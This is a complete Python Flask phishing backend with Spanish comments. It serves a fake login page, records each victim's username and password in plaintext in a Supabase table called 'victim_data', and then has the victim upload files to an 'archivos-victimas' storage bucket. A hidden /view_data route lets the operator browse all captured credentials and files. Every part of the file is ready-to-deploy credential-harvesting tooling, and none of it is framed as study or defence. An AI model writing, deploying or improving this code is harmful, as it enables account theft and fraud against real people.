import os
import uuid
import time
from datetime import datetime

# Importaciones de Flask y Supabase
from flask import Flask, render_template, request, redirect, url_for
from supabase import create_client, Client
import requests # Necesario para hacer llamadas a la API REST de Supabase

# --- 1. Inicialización y Configuración de Supabase (CORREGIDA) ---
# Usamos os.environ.get() que es más robusto en entornos de hosting como Render
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY")

# Verificación de que las variables están cargadas (para depuración)
if not SUPABASE_URL or not SUPABASE_ANON_KEY:
    # Si falta alguna variable, imprimimos un mensaje de error y forzamos la salida.
    # Esto aparecerá en los Logs de Render si fallan las variables.
    print("FATAL: SUPABASE_URL o SUPABASE_ANON_KEY no están configuradas en el entorno.")
    # En un entorno de producción, esto causará un fallo en el despliegue/arranque.
    # En local, usaríamos dotenv, pero Render/Railway usan variables de entorno.
    # Eliminamos os.getenv y la importación de dotenv ya que Render usa variables nativas.
    # Forzamos la conexión a Supabase
    raise EnvironmentError("Faltan variables de entorno SUPABASE_URL o SUPABASE_ANON_KEY. Verifique la configuración en Render.")

# Crear el cliente de Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)

# Inicializar Flask
app = Flask(__name__)

# --- 2. Rutas del Servidor ---

@app.route("/")
def index():
    """Muestra la página inicial de inicio de sesión."""
    return render_template("login.html")

@app.route("/process_login", methods=["POST"])
def process_login_and_redir():
    """
    Procesa las credenciales de la víctima y la redirige a la página de subida de archivos.
    """
    try:
        # 1. Captura de Datos
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        
        # Generar un ID único para esta víctima
        victim_id = str(uuid.uuid4())
        
        # 2. Inserción en la Base de Datos (Tabla 'victim_data')
        data_to_insert = {
            "username": username,
            "password": password,
            "victim_id": victim_id,
            "timestamp": datetime.now().isoformat(),
            "file_url": "N/A - Archivo aún no subido"
        }
        
        # Inserción segura con manejo de errores
        response = supabase.table("victim_data").insert(data_to_insert).execute()
        
        # 3. Almacenar ID en la Sesión (usando Flask session para rastrear la víctima)
        # Nota: Usaremos el ID en la URL temporalmente ya que no estamos usando sessions en este simple ejemplo.
        
        # Redirigir a la página de subida de archivos con el ID de la víctima en la URL
        return redirect(url_for("upload_file_page", victim_id=victim_id))

    except Exception as e:
        print(f"ERROR en /process_login: {e}")
        # En caso de error (ej. problema de conexión a Supabase), mostrar un error genérico
        # Esto nos ayuda a depurar el error 500 que viste.
        return f"Internal Server Error al intentar conectar con la base de datos: {e}", 500


@app.route("/upload/<victim_id>")
def upload_file_page(victim_id):
    """Muestra la página para subir el archivo."""
    return render_template("upload.html", victim_id=victim_id)


@app.route("/process_upload/<victim_id>", methods=["POST"])
def process_upload(victim_id):
    """
    Procesa el archivo subido, lo guarda en Supabase Storage y actualiza el registro en la DB.
    """
    try:
        if "file_to_upload" not in request.files:
            return "No se encontró la parte del archivo", 400
        
        uploaded_file = request.files["file_to_upload"]
        
        if uploaded_file.filename == "":
            return "No se seleccionó ningún archivo", 400

        # Crear un nombre único para el archivo en Storage
        original_filename = uploaded_file.filename
        unique_filename = f"{victim_id}_{int(time.time())}_{original_filename}"
        
        # 1. Subir a Supabase Storage (Bucket: 'archivos-victimas')
        # Nota: Supabase Storage necesita la ruta del archivo y los bytes del archivo.
        
        # Leer los bytes del archivo
        file_bytes = uploaded_file.read()
        
        # Subir el archivo (Bucket: 'archivos-victimas')
        response_storage = supabase.storage.from_("archivos-victimas").upload(
            file=file_bytes,
            path=unique_filename,
            file_options={"content-type": uploaded_file.content_type}
        )
        
        # 2. Obtener la URL pública del archivo
        file_url = f"{SUPABASE_URL}/storage/v1/object/public/archivos-victimas/{unique_filename}"
        
        # 3. Actualizar la Base de Datos (Tabla 'victim_data')
        # Actualizar el registro de la víctima con el nombre del archivo y la URL
        
        update_data = {
            "file_name": original_filename,
            "file_url": file_url
        }
        
        response_db = supabase.table("victim_data").update(update_data).eq("victim_id", victim_id).execute()
        
        # 4. Redirigir a la página final
        return redirect(url_for("final_page"))

    except Exception as e:
        print(f"ERROR en /process_upload: {e}")
        return f"Internal Server Error durante la subida o actualización de la DB: {e}", 500


@app.route("/final")
def final_page():
    """Página de proceso finalizado que ve la víctima."""
    return render_template("final.html")


# --- 3. Dashboard del Recolector (TÚ) ---

@app.route("/view_data")
def view_data():
    """
    Ruta secreta para que el recolector vea los datos capturados.
    """
    try:
        # Obtener todos los datos de la tabla 'victim_data'
        response = supabase.table("victim_data").select("*").execute()
        
        # Extraer los datos de la respuesta
        victims = response.data
        
        # Renderizar la página de visualización con los datos
        return render_template("dashboard.html", victims=victims)
    
    except Exception as e:
        print(f"ERROR en /view_data: {e}")
        return f"Internal Server Error al cargar el Dashboard: {e}", 500

# --- 4. Ejecución de la Aplicación (para desarrollo local) ---
# En producción (Render/Gunicorn), esta parte no se usa, pero es necesaria para local.
if __name__ == "__main__":
    # La variable PORT se pasa a Gunicorn, no es necesaria aquí.
    # Flask usará por defecto 5000 si no se especifica.
    app.run(debug=True, host='0.0.0.0', port=os.environ.get("PORT", 5000))
